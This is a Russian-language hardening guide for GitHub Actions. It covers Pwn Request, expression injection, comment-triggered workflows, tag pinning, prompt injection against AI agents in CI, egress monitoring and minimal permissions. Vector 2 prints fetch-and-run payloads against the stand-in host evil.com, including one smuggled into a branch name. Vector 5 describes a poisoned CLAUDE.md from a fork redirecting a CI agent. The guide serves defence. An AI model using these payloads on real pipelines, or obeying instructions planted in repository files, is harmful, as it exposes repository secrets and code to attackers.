# GitHub Actions — Hardening против injection и supply chain атак

> Основано на реальной кампании hackerbot-claw (февраль–март 2026).
> Источник: https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation

---

## TL;DR — чеклист

- [ ] Пинить все `uses:` по SHA, не по тегу
- [ ] `pull_request_target` + checkout кода из форка — запрещено
- [ ] Все `${{ github.event.* }}` в bash — только через `env:`, не напрямую
- [ ] Триггеры по комментариям — проверять `author_association`
- [ ] Минимальные `permissions` на каждый job
- [ ] AI-агенты в CI — не давать write permissions на основе PR из форка
- [ ] Egress monitoring (StepSecurity Harden-Runner)

---

## Вектор 1 — `pull_request_target` + checkout кода из форка (Pwn Request)

Самый опасный паттерн. `pull_request_target` даёт доступ к секретам репозитория,
но если при этом чекаутить код из форка — секреты попадают в руки атакующего.

```yaml
# ❌ УЯЗВИМО — classic Pwn Request
on: pull_request_target
steps:
  - uses: actions/checkout@v3
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # код атакующего
  - run: go run ./.github/scripts/check-quality/      # исполняется с правами репо

# ✅ БЕЗОПАСНО — не чекаутить код из PR в pull_request_target
on: pull_request_target
steps:
  - uses: actions/checkout@v3
    # без ref — чекаутится только base ветка (безопасная)

# ✅ АЛЬТЕРНАТИВА — использовать pull_request вместо pull_request_target
# pull_request не имеет доступа к секретам → форк ничего не получит
on: pull_request
```

**Правило:** если нужен `pull_request_target` — никогда не делать checkout кода из PR-ветки.
Данные о PR (номер, автор, заголовок) — можно. Код — нельзя.

---

## Вектор 2 — Expression injection через имена веток, файлов, PR-заголовков

`${{ github.event.* }}` — это untrusted user input. Если подставить напрямую в bash,
атакующий может передать `$(curl evil.com | bash)` в имени ветки или файла.

```yaml
# ❌ УЯЗВИМО — прямая подстановка в bash
- name: Save branch name
  run: echo "${{ github.event.pull_request.head.ref }}" > branch.txt

# Атакующий называет ветку:
# dev$({curl,-sSfL,evil.com/payload}${IFS}|${IFS}bash)
# → bash выполняет команду

# ✅ БЕЗОПАСНО — через environment variable
- name: Save branch name
  run: echo "$BRANCH_NAME" > branch.txt
  env:
    BRANCH_NAME: ${{ github.event.pull_request.head.ref }}
```

**Правило:** любой `${{ github.event.pull_request.* }}`, `${{ github.head_ref }}`,
`${{ github.event.comment.body }}` и аналоги — **только через `env:`**, никогда напрямую в `run:`.

Полный список опасных переменных:
```
github.event.pull_request.title
github.event.pull_request.body
github.event.pull_request.head.ref       # имя ветки из форка
github.event.pull_request.head.label
github.event.comment.body
github.event.issue.title
github.event.issue.body
github.event.workflow_run.head_branch
```

---

## Вектор 3 — Триггер по комментарию без проверки автора

Если workflow запускается по комментарию (`/command`) без проверки кто пишет —
любой внешний пользователь может триггернуть выполнение кода.

```yaml
# ❌ УЯЗВИМО — любой может написать /version minor
on:
  issue_comment:
    types: [created]
jobs:
  bump:
    if: contains(github.event.comment.body, '/version')
    steps:
      - run: ./version.sh  # исполняется код из PR-ветки

# ✅ БЕЗОПАСНО — проверять принадлежность к репозиторию
jobs:
  bump:
    if: |
      contains(github.event.comment.body, '/version') &&
      (
        github.event.comment.author_association == 'OWNER' ||
        github.event.comment.author_association == 'MEMBER' ||
        github.event.comment.author_association == 'COLLABORATOR'
      )
```

Значения `author_association`:
| Значение | Кто |
|---|---|
| `OWNER` | Владелец репозитория |
| `MEMBER` | Член организации |
| `COLLABORATOR` | Добавленный коллаборатор |
| `CONTRIBUTOR` | Ранее делал merged PR — **не доверять** |
| `FIRST_TIME_CONTRIBUTOR` | Первый PR — **не доверять** |
| `NONE` | Посторонний — **не доверять** |

---

## Вектор 4 — Плавающие теги в `uses:` (supply chain)

Теги в GitHub Actions можно force-push'нуть. Именно так hackerbot-claw подменил
75 тегов `aquasecurity/trivy-action` — все пайплайны мгновенно получили малварь.

```yaml
# ❌ УЯЗВИМО — тег можно перезаписать
uses: aquasecurity/trivy-action@v0.20.0
uses: actions/checkout@v4
uses: some-action@latest

# ✅ БЕЗОПАСНО — SHA нельзя подменить
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
uses: aquasecurity/trivy-action@57a97c7e7821a5776cebc9bb87c984fa69cba8f1  # 0.35.0
```

Как найти SHA для любого action:
```bash
# Через git
git ls-remote https://github.com/actions/checkout refs/tags/v4.2.2

# Или на странице репозитория: commits → найти тег → скопировать SHA
```

Инструменты для автоматического пиннинга:
- **Dependabot** — автообновление action dependencies по SHA
- **Renovate** — аналог, более гибкий

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

---

## Вектор 5 — Prompt injection на AI-агента в CI

Если CI запускает LLM-агента (Claude Code, GPT-агент) и тот читает файлы из форка —
атакующий может отравить файл с инструкциями (CLAUDE.md, .cursorrules, system prompt).

```yaml
# ❌ УЯЗВИМО — AI читает CLAUDE.md из форка как доверенный контекст
on: pull_request_target
steps:
  - uses: actions/checkout@v3
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # отравленный CLAUDE.md
  - run: claude-code --project-instructions CLAUDE.md  # инструкции атакующего

# ✅ БЕЗОПАСНО — читать project config только из base ветки
on: pull_request_target
steps:
  - uses: actions/checkout@v3  # без ref — base ветка
  - run: claude-code --project-instructions CLAUDE.md  # только свой файл
```

**Правило:** AI-агент в CI должен работать в **read-only режиме** на PR из форков.
Никаких write permissions, push, merge — только анализ и комментарии.

```yaml
# Явно ограничивать permissions для AI-job
permissions:
  contents: read
  pull-requests: write  # только комментирование
  # НЕТ: contents: write, actions: write
```

---

## Системная защита — Egress Monitoring

Даже при успешном RCE — если заблокировать исходящий трафик, данные не утекут.
StepSecurity Harden-Runner делает именно это прямо в GitHub Runner.

```yaml
# Добавить первым шагом в каждый job
steps:
  - uses: step-security/harden-runner@91182cccc01eb5e233317f9f4f0fc4f7e58a41f6  # v2.10.4
    with:
      egress-policy: audit    # логировать все исходящие запросы
      # egress-policy: block  # блокировать всё кроме allowed-endpoints
      allowed-endpoints: >
        github.com:443
        api.github.com:443
        objects.githubusercontent.com:443
```

---

## Минимальные permissions (обязательно)

По умолчанию GitHub выдаёт `contents: write` — избыточно почти всегда.

```yaml
# На уровне всего workflow
permissions:
  contents: read

jobs:
  build:
    permissions:
      contents: read        # читать код
      packages: write       # пушить в GitHub Packages (если нужно)
    steps: ...

  comment:
    permissions:
      pull-requests: write  # только комментировать PR
    steps: ...
```

---

## Итоговые правила одной строкой

1. **`pull_request_target` + checkout из форка = Pwn Request** — никогда
2. **`${{ github.event.* }}` в bash** — только через `env:`, никогда напрямую
3. **Комментарий-триггеры** — проверять `author_association` (OWNER/MEMBER/COLLABORATOR)
4. **`uses:` по тегу** — всегда пинить по SHA
5. **AI в CI** — read-only на форках, project config только из base ветки
6. **`permissions`** — явно указывать минимальные на каждый job
7. **Egress monitoring** — Harden-Runner или аналог в prod

---

## Ссылки

- StepSecurity: https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation
- GitHub Docs — Security hardening: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- Harden-Runner: https://github.com/step-security/harden-runner
- Pwn Request pattern: https://www.stepsecurity.io/blog/github-actions-pwn-request-vulnerability
